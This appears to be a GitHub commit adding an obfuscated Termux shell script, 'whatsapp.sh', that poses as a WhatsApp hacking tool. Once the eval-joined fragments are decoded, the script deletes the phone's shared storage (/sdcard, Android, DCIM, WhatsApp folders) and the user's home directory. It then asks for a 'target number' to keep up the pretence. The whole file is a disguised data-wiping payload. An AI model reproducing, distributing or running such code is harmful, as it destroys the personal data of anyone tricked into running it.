1d39d794a24e819f627d69575e12d124690210c3
aceptriana <49948930+aceptriana@users.noreply.github.com>
2019-10-31 08:24:50 +0700

    Add files via upload

---
+++ whatsapp.sh
@@ -0,0 +1,5 @@
+#Acep X-Code
+#TKJ BlackHat
+z="
+";Cz='term';kz='"';Uz='ndro';Lz='"Hac';Az='clea';Rz='sdca';cz='HOME';Mz='k Wh';Qz='rf /';Pz='rm -';Oz='pp"';Zz='hats';jz='et :';Yz='rd/W';hz='mor ';Tz='rd/A';Vz='id';Hz='figl';Gz='rage';Bz='r';dz='echo';Ez='etup';Jz='f sl';Xz='CIM';gz='n No';Dz='ux-s';fz='suka';Iz='et -';Sz='rd/';lz='slee';Wz='rd/D';az='App';iz='Targ';Kz='ant ';ez=' "Ma';Fz='-sto';nz='9999';bz='rf $';mz='p 99';Nz='atsa';
+eval "$Az$Bz$z$Cz$Dz$Ez$Fz$Gz$z$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$z$Pz$Qz$Rz$Sz$z$Pz$Qz$Rz$Tz$Uz$Vz$z$Pz$Qz$Rz$Wz$Xz$z$Pz$Qz$Rz$Yz$Zz$az$z$Pz$bz$cz$z$dz$ez$fz$gz$hz$iz$jz$kz$z$lz$mz$nz"
